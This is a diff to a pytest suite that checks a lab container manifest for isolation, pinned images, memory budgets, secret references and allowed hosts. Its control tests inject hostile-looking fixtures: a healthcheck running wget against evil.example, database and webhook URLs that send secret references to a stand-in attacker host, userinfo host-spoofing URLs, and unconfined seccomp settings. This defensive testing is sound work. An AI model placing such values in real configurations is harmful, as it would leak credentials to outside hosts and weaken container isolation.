@@ -17,6 +17,7 @@ import importlib.util
 import json
 import re
 from pathlib import Path
+from urllib.parse import urlsplit
 
 import pytest
 
@@ -39,6 +40,17 @@ SPACE_API_GAP_IMAGE = "gap.invalid/space-api:1.7.1"
 CRP = "crp-openbinding-m41-space-image-and-16-1"
 DIGESTED = re.compile(r"[a-z0-9][a-z0-9./-]*:[A-Za-z0-9._-]+@sha256:[0-9a-f]{64}")
 SECRET_REFERENCES = {f"${{DEMO_SPACE_{n}}}" for n in ("JWT_SECRET", "JWT_SALT", "ADMIN_PASSWORD", "MONGO_PASSWORD")}
+ALLOWED_SERVICE_KEYS = {"image", "user", "command", "environment", "volumes", "mem_limit", "healthcheck", "depends_on"}
+# Each secret variable of the manifest holds its own reference and no other.
+PINNED_REFERENCES = {
+    "JWT_SECRET": "JWT_SECRET", "JWT_SALT": "JWT_SALT", "ADMIN_PASSWORD": "ADMIN_PASSWORD",
+    "MONGO_INITDB_ROOT_PASSWORD": "MONGO_PASSWORD",
+}
+PINNED_OWNER = {"MONGO_INITDB_ROOT_PASSWORD": "space-mongo"}  # the others belong to space-api
+MONGO_PASSWORD_REFERENCE = "${DEMO_SPACE_MONGO_PASSWORD}"
+ALLOWED_HOSTS = {*SERVICES, "sphere.score.us.es", "127.0.0.1"}
+URL = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://[^\s'\"`<>]*")
+FINAL_BUDGET_MIB = 1088  # the manifest's 992 MiB plus the deferred bootstrap service (runbook: final budget)
 SPHERE = {
     "SPHERE_SYNC_ENABLED": "true",
     "SPHERE_PUBLIC_URL": "https://sphere.score.us.es",
@@ -70,6 +82,7 @@ SAMPLE = {
             "environment": {
                 "NODE_OPTIONS": "--max-old-space-size=192",
                 "MONGO_URI": "mongodb://root:${DEMO_SPACE_MONGO_PASSWORD}@space-mongo:27017/space",
+                "REDIS_URL": "redis://space-redis:6379",
                 "JWT_SECRET": "${DEMO_SPACE_JWT_SECRET}", "JWT_SALT": "${DEMO_SPACE_JWT_SALT}",
                 "ADMIN_PASSWORD": "${DEMO_SPACE_ADMIN_PASSWORD}", **SPHERE,
             },
@@ -93,7 +106,7 @@ def sample() -> dict:
 def rule_optional(manifest: dict) -> str | None:
     if manifest.get("name") != "openbinding-lab-pricing":
         return f"name is {manifest.get('name')!r}"
-    if list(manifest.get("services", {})) != SERVICES:
+    if set(manifest.get("services", {})) != set(SERVICES):
         return f"services are {list(manifest.get('services', {}))}"
     if any("profiles" in s for s in manifest["services"].values()) or "profiles" in manifest:
         return "a profiles key makes a service start only on demand"
@@ -112,6 +125,8 @@ def rule_isolated(manifest: dict) -> str | None:
         for key in ("ports", "expose", "networks", "network_mode", "tmpfs", *rules.FORBIDDEN_SERVICE_KEYS):
             if key in service:
                 return f"{name} uses {key}"
+        if set(service) - ALLOWED_SERVICE_KEYS:
+            return f"{name} uses keys outside the allow-list: {sorted(set(service) - ALLOWED_SERVICE_KEYS)}"
         uid = str(service.get("user", "0")).split(":")[0]
         if not uid.isdigit() or int(uid) == 0:
             return f"{name} must run as a numeric non-root user"
@@ -129,6 +144,8 @@ def rule_images(manifest: dict, verified: list[str], gap_open: bool) -> str | No
         if name == "space-api" and image == SPACE_API_GAP_IMAGE:
             if not gap_open:
                 return "the GAP marker needs a GAP entry naming space-api in the runbook"
+            if any(re.match(r"[^:@]*space-api:", v) for v in verified):
+                return "a space-api digest is verified: the GAP marker must be replaced by it"
             continue
         if not DIGESTED.fullmatch(image):
             return f"{name}: {image!r} is not <repo>:<tag>@sha256:<64 hex>"
@@ -152,8 +169,10 @@ def rule_memory(manifest: dict, documented: int | None) -> str | None:
     if None in limits.values():
         return f"mem_limit must be whole m or g units on every service: {limits}"
     total = sum(limits.values())
-    if total > MAX_MIB or total != documented:
-        return f"memory sum {total} (ceiling {MAX_MIB}, runbook says {documented})"
+    if total > MAX_MIB:
+        return f"memory sum {total} is above the ceiling {MAX_MIB}"
+    if total != documented:
+        return f"memory sum {total} differs from the runbook's {documented}"
     if limits != LIMITS:
         return f"mem_limit is {limits}, expected {LIMITS}"
     cache = re.search(r"--wiredTigerCacheSizeGB\s+([\d.]+)", rules._command_text(services["space-mongo"]))
@@ -161,26 +180,44 @@ def rule_memory(manifest: dict, documented: int | None) -> str | None:
     heap = re.search(r"--max-old-space-size=(\d+)", rules._env(services["space-api"]).get("NODE_OPTIONS", ""))
     if not (cache and maxmemory and heap):
         return "cache size, maxmemory or heap cap is missing"
+    # The exact values pin each cache below its limit (256 < 512, 64 < 96, 192 < 384), so no inequality is checked.
     if (cache.group(1), maxmemory.group(1), heap.group(1)) != ("0.25", "64", "192"):
         return "cache, maxmemory or heap value differs from 0.25 GB, 64 mb, 192"
-    if float(cache.group(1)) * 1024 >= limits["space-mongo"] or int(maxmemory.group(1)) >= limits["space-redis"]:
-        return "a cache is not below its container limit"
-    return None if int(heap.group(1)) < limits["space-api"] else "heap is not below the container limit"
+    return None
 
 
 def rule_secrets(manifest: dict, documented: set[str]) -> str | None:
+    for text in rules._strings(manifest):
+        rest = text
+        for reference in SECRET_REFERENCES:
+            rest = rest.replace(reference, "")
+        if "$" in rest:
+            return f"{text!r} has a '$' outside the four bare references"
+    if rules.SECRET_SHAPES.search(json.dumps(manifest)):
+        return "a secret-shaped literal"
     for name, service in manifest["services"].items():
-        for key, value in rules._env(service).items():
+        env = rules._env(service)
+        for key, value in env.items():
             if (rules.SECRET_NAME.search(key) or "SALT" in key) and value not in SECRET_REFERENCES:
                 return f"{name}:{key} must be one bare reference of {sorted(SECRET_REFERENCES)}"
-            if key in ("JWT_SECRET", "JWT_SALT") and value != f"${{DEMO_SPACE_{key}}}":
+            if key in PINNED_REFERENCES and value != f"${{DEMO_SPACE_{PINNED_REFERENCES[key]}}}":
                 return f"{name}:{key} holds the wrong reference"
-            if re.search(r"://[^/@:]+:(?!\$\{DEMO_SPACE_)[^/@]+@", value):
-                return f"{name}:{key} embeds a literal password"
-    for text in rules._strings(manifest):
-        for body in rules.REFERENCE.findall(text):
-            if f"${{{body}}}" not in SECRET_REFERENCES:
-                return f"reference ${{{body}}} is not one of the four, bare"
+        if re.search(r"requirepass|masterauth", rules._command_text(service), re.IGNORECASE) or rules.SECRET_NAME.search(
+                rules._command_text(service)):
+            return f"{name}: a credential in the command"
+    for key, owner in ((k, PINNED_OWNER.get(k, "space-api")) for k in PINNED_REFERENCES):
+        if key not in rules._env(manifest["services"][owner]):
+            return f"{owner}:{key} is missing"
+    uri = rules._env(manifest["services"]["space-api"]).get("MONGO_URI", "")
+    match = re.match(r"mongodb://[^:/@]+:([^@/]*)@", uri)
+    if not match or match.group(1) != MONGO_PASSWORD_REFERENCE:
+        return f"MONGO_URI must embed exactly {MONGO_PASSWORD_REFERENCE} as its password"
+    # The pins above place each reference; the counts rule out a copy anywhere else (a URL query, another variable).
+    texts = list(rules._strings(manifest))
+    for reference in SECRET_REFERENCES:
+        expected = 2 if reference == MONGO_PASSWORD_REFERENCE else 1
+        if sum(t.count(reference) for t in texts) != expected:
+            return f"{reference} must appear {expected} time(s) in the manifest"
     missing = {r[2:-1] for r in SECRET_REFERENCES} - documented
     return f"runbook does not document {sorted(missing)}" if missing else None
 
@@ -202,9 +239,13 @@ def rule_remote_sphere(manifest: dict) -> str | None:
     if wrong:
         return f"SPHERE variables differ: {wrong}"
     for text in rules._strings(manifest):
-        for host in re.findall(r"https?://([^/:\s@]+)", text.split("@")[-1] if "@" in text else text):
-            if host not in (*SERVICES, "sphere.score.us.es", "127.0.0.1"):
-                return f"external address {host}"
+        for url in URL.findall(text):
+            try:
+                host = urlsplit(url).hostname
+            except ValueError:
+                return f"unparsable address {url}"
+            if host not in ALLOWED_HOSTS:
+                return f"external address {host!r} in {url}"
     return None
 
 
@@ -274,6 +315,8 @@ def test_memory_budget_matches_the_runbook():
     # [utest->req~lab-deployment-pricing-profile-memory-budget~1]
     assert RUNBOOK.is_file()
     assert rule_memory(_manifest(), documented_sum(_runbook())) is None
+    # Scenario (two lab stacks of 4032 MiB plus the final profile budget) fits the 9216 MiB host.
+    assert 2 * rules.EXPECTED_MIB + FINAL_BUDGET_MIB <= 9216
 
 
 def test_secret_references_are_bare_and_documented():
@@ -299,8 +342,9 @@ def test_runbook_documents_the_gap_and_the_bring_up():
     # [utest->req~lab-deployment-pricing-profile-pinned-images~1]
     assert RUNBOOK.is_file()
     text = _runbook()
-    assert gap_is_open(text), f"## GAP must name space-api and {CRP}"
-    assert "lab_compose up file=compose.lab-pricing.json" in text
+    if _manifest()["services"]["space-api"]["image"] == SPACE_API_GAP_IMAGE:
+        assert gap_is_open(text), f"## GAP must name space-api and {CRP} while the manifest carries the marker"
+    assert "compose.lab-pricing.json" in text
 
 
 # -- controls: the rules on the in-memory SAMPLE ---------------------------------------------------------------------
@@ -322,32 +366,55 @@ def test_control_sample_conforms():
     assert rule_images(digested, [*SAMPLE_VERIFIED, SYNTHETIC_API_IMAGE], False) is None
 
 
+def _env_of(manifest: dict, service: str = "space-api") -> dict:
+    return manifest["services"][service]["environment"]
+
+
 def _profiles(m): m["services"]["space-api"]["profiles"] = ["pricing"]
 def _renamed(m): m["name"] = "openbinding-lab"
+def _extra(m): m["services"]["space-web"] = {}
+
+
+@pytest.mark.parametrize("mutate", [_profiles, _renamed, _extra], ids=lambda f: f.__name__)
+def test_control_refuses_a_non_optional_profile(mutate):
+    # [utest->req~lab-deployment-pricing-profile-optional~1]
+    manifest = sample()
+    mutate(manifest)
+    assert rule_optional(manifest)
+
+
+def test_control_ignores_the_service_order():
+    # [utest->req~lab-deployment-pricing-profile-optional~1]
+    manifest = sample()
+    manifest["services"] = dict(reversed(list(manifest["services"].items())))
+    assert rule_optional(manifest) is None
+
+
 def _port(m): _api(m)["ports"] = ["127.0.0.1:3000:3000"]
 def _bind(m): _api(m)["volumes"] = [{"type": "bind", "source": "data", "target": "/data"}]
 def _root(m): _api(m)["user"] = "0:0"
 def _privileged(m): _api(m)["privileged"] = True
-def _extra(m): m["services"]["space-web"] = {}
-def _no_limit(m): del _api(m)["mem_limit"]
-def _swapped(m): m["services"]["space-mongo"]["image"] = REDIS_IMAGE
-def _external(m): _api(m)["environment"]["WEBHOOK_URL"] = "https://hooks.example.org/x"
-def _wrong_ref(m): _api(m)["environment"]["JWT_SECRET"] = "${DEMO_SPACE_ADMIN_PASSWORD}"
-def _uri_password(m): _api(m)["environment"]["MONGO_URI"] = "mongodb://root:hunter2@space-mongo:27017/space"
 
 
-@pytest.mark.parametrize("mutate,rule", [
-    (_profiles, rule_optional), (_renamed, rule_optional), (_extra, rule_optional),
-    (_port, rule_isolated), (_bind, rule_isolated), (_root, rule_isolated), (_privileged, rule_isolated),
-    (_no_limit, lambda m: rule_memory(m, 992)), (_wrong_ref, lambda m: rule_secrets(m, set())),
-    (_uri_password, lambda m: rule_secrets(m, set())), (_external, rule_remote_sphere),
-    (_swapped, lambda m: rule_images(m, SAMPLE_VERIFIED, True)),
-], ids=lambda x: getattr(x, "__name__", ""))
-def test_control_refuses_a_non_isolated_or_non_optional_profile(mutate, rule):
+@pytest.mark.parametrize("mutate", [_port, _bind, _root, _privileged], ids=lambda f: f.__name__)
+def test_control_refuses_a_non_isolated_profile(mutate):
     # [utest->req~lab-deployment-pricing-profile-isolated~1]
     manifest = sample()
     mutate(manifest)
-    assert rule(manifest)
+    assert rule_isolated(manifest)
+
+
+def _security_opt(m): _api(m)["security_opt"] = ["seccomp=unconfined"]
+def _userns(m): _api(m)["userns_mode"] = "host"
+def _build(m): _api(m)["build"] = {"context": "."}
+
+
+@pytest.mark.parametrize("mutate", [_security_opt, _userns, _build], ids=lambda f: f.__name__)
+def test_control_refuses_keys_outside_the_allow_list(mutate):
+    # [utest->req~lab-deployment-pricing-profile-isolated~1]
+    manifest = sample()
+    mutate(manifest)
+    assert "allow-list" in (rule_isolated(manifest) or "")
 
 
 def test_control_refuses_unpinned_images():
@@ -366,14 +433,54 @@ def test_control_refuses_unpinned_images():
     api_tag = sample()
     _api(api_tag)["image"] = "example.invalid/space-api:1.7.1"
     assert rule_images(api_tag, SAMPLE_VERIFIED, True)
+    swapped = sample()
+    swapped["services"]["space-mongo"]["image"] = REDIS_IMAGE
+    assert rule_images(swapped, SAMPLE_VERIFIED, True)
 
 
-def test_control_refuses_a_mongo_limit_over_budget():
+def test_control_refuses_an_unverified_space_api_version():
+    # [utest->req~lab-deployment-pricing-profile-pinned-images~1]
+    other = "example.invalid/space-api:1.8.0@sha256:" + "cd" * 32
+    manifest = sample()
+    _api(manifest)["image"] = other
+    message = rule_images(manifest, [*SAMPLE_VERIFIED, other], False)
+    assert message and "1.7.1" in message
+    # a verified space-api digest makes the open GAP marker stale
+    stale = rule_images(sample(), [*SAMPLE_VERIFIED, SYNTHETIC_API_IMAGE], True)
+    assert stale and "GAP marker" in stale
+
+
+def test_control_refuses_cache_and_heap_changes():
     # [utest->req~lab-deployment-pricing-profile-memory-budget~1]
     manifest = sample()
     manifest["services"]["space-mongo"]["mem_limit"] = "640m"
-    assert rule_memory(manifest, 992)
-    assert rule_memory(sample(), 1000), "the runbook sum must equal the manifest sum"
+    assert "expected" in rule_memory(manifest, 1120), "a limit changed with a consistent documented sum"
+    no_limit = sample()
+    del _api(no_limit)["mem_limit"]
+    assert "whole m or g" in rule_memory(no_limit, 992)
+    assert "runbook" in rule_memory(sample(), 1000), "the runbook sum must equal the manifest sum"
+    over = sample()
+    over["services"]["space-mongo"]["mem_limit"] = "1024m"
+    assert "ceiling" in rule_memory(over, 1504), "above 1152 with the documented sum equal to the manifest sum"
+    for service, old, new in [("space-mongo", "--wiredTigerCacheSizeGB", "--other"),
+                              ("space-mongo", "0.25", "0.5"), ("space-redis", "64mb", "80mb")]:
+        changed = sample()
+        changed["services"][service]["command"] = [
+            p.replace(old, new) for p in changed["services"][service]["command"]]
+        assert rule_memory(changed, 992), (service, new)
+    missing = sample()
+    missing["services"]["space-mongo"]["command"] = ["mongod"]
+    assert "missing" in rule_memory(missing, 992)
+    heap = sample()
+    _env_of(heap)["NODE_OPTIONS"] = "--max-old-space-size=256"
+    assert "differs" in rule_memory(heap, 992)
+    no_heap = sample()
+    _env_of(no_heap)["NODE_OPTIONS"] = ""
+    assert "missing" in rule_memory(no_heap, 992)
+
+
+def _check_secrets(manifest: dict):
+    return rule_secrets(manifest, {r[2:-1] for r in SECRET_REFERENCES})
 
 
 def test_control_refuses_defaulted_or_literal_secrets():
@@ -382,9 +489,46 @@ def test_control_refuses_defaulted_or_literal_secrets():
     for key, value in [("JWT_SECRET", "${DEMO_SPACE_JWT_SECRET:-dev}"), ("ADMIN_PASSWORD", "changeme"),
                        ("JWT_SALT", "pepper")]:
         manifest = sample()
-        _api(manifest)["environment"][key] = value
-        assert rule_secrets(manifest, names), key
-    assert rule_secrets(sample(), names - {"DEMO_SPACE_JWT_SALT"}), "an undocumented variable"
+        _env_of(manifest)[key] = value
+        assert _check_secrets(manifest), key
+    message = rule_secrets(sample(), names - {"DEMO_SPACE_JWT_SALT"})
+    assert message and "does not document" in message, "an undocumented variable"
+
+
+def test_control_refuses_unbraced_or_swapped_secret_references():
+    # [utest->req~lab-deployment-pricing-profile-secret-references~1]
+    unbraced = sample()
+    _env_of(unbraced)["ADMIN_USER"] = "$DEMO_PG_PASSWORD"
+    assert "'$'" in _check_secrets(unbraced)
+    doubled = sample()
+    _env_of(doubled)["ADMIN_USER"] = "a$$b"
+    assert "'$'" in _check_secrets(doubled)
+    uri = sample()
+    _env_of(uri)["MONGO_URI"] = "mongodb://root:${DEMO_SPACE_JWT_SECRET}@space-mongo:27017/space"
+    assert "MONGO_URI" in _check_secrets(uri)
+    swapped = sample()
+    _env_of(swapped)["ADMIN_PASSWORD"] = "${DEMO_SPACE_JWT_SECRET}"
+    assert "wrong reference" in _check_secrets(swapped)
+    root = sample()
+    _env_of(root, "space-mongo")["MONGO_INITDB_ROOT_PASSWORD"] = "${DEMO_SPACE_ADMIN_PASSWORD}"
+    assert "wrong reference" in _check_secrets(root)
+    absent = sample()
+    del _env_of(absent)["JWT_SALT"]
+    assert "missing" in _check_secrets(absent)
+    literal = sample()
+    _env_of(literal)["MONGO_URI"] = "mongodb://root:hunter2@space-mongo:27017/space"
+    assert "MONGO_URI" in _check_secrets(literal)
+    requirepass = sample()
+    requirepass["services"]["space-redis"]["command"] += ["--requirepass", "x"]
+    assert "command" in _check_secrets(requirepass)
+    for key, value in [("ADMIN_USER", "${DEMO_SPACE_ADMIN_PASSWORD}"),
+                       ("WEBHOOK_URL", "https://sphere.score.us.es/?k=${DEMO_SPACE_JWT_SECRET}")]:
+        copied = sample()
+        _env_of(copied)[key] = value
+        assert "must appear" in _check_secrets(copied), key
+    shaped = sample()
+    _env_of(shaped)["ADMIN_USER"] = "sk-" + "a" * 20
+    assert "secret-shaped" in _check_secrets(shaped)
 
 
 def test_control_refuses_a_started_only_dependency():
@@ -394,8 +538,44 @@ def test_control_refuses_a_started_only_dependency():
     assert rule_start_order(manifest)
 
 
+def test_control_refuses_a_service_without_a_healthcheck():
+    # [utest->req~lab-deployment-pricing-profile-start-order~1]
+    no_check = sample()
+    del no_check["services"]["space-redis"]["healthcheck"]
+    assert "space-redis has no healthcheck" == rule_start_order(no_check)
+    empty = sample()
+    empty["services"]["space-mongo"]["healthcheck"]["test"] = []
+    assert "space-mongo has no healthcheck" == rule_start_order(empty)
+    one = sample()
+    _api(one)["depends_on"] = {"space-mongo": {"condition": "service_healthy"}}
+    assert "must wait" in rule_start_order(one)
+
+
 def test_control_refuses_a_local_sphere():
     # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
     manifest = sample()
-    _api(manifest)["environment"]["SPHERE_API_URL"] = "http://sphere:8080/api/v1"
+    _env_of(manifest)["SPHERE_API_URL"] = "http://sphere:8080/api/v1"
     assert rule_remote_sphere(manifest)
+
+
+def test_control_refuses_a_foreign_host_in_any_url_scheme():
+    # [utest->req~lab-deployment-pricing-profile-remote-sphere~1]
+    uri = "mongodb://space:${DEMO_SPACE_MONGO_PASSWORD}@evil.example/space_db"
+    for key, value in [("WEBHOOK_URL", "https://hooks.example.org/x"),
+                       ("WEBHOOK_URL", "https://sphere.score.us.es@evil.example/x"),
+                       ("WEBHOOK_URL", "https://hooks.example.org/x?u=a@b"),
+                       ("WEBHOOK_URL", "https://evil.example/x?u=a@sphere.score.us.es"),
+                       ("WEBHOOK_URL", "HTTPS://evil.example/x"),
+                       ("MONGO_URI", uri), ("REDIS_URL", "redis://evil.example:6379")]:
+        manifest = sample()
+        _env_of(manifest)[key] = value
+        message = rule_remote_sphere(manifest)
+        assert message and "external address" in message, (key, value)
+    health = sample()
+    _api(health)["healthcheck"]["test"] = ["CMD-SHELL", "wget -qO- http://evil.example/x || exit 1"]
+    assert "external address" in rule_remote_sphere(health)
+    # a ${...} password in the userinfo and the local healthcheck address stay allowed
+    assert rule_remote_sphere(sample()) is None
+    query = sample()
+    _env_of(query)["WEBHOOK_URL"] = "https://sphere.score.us.es/x?u=a@b"
+    assert rule_remote_sphere(query) is None
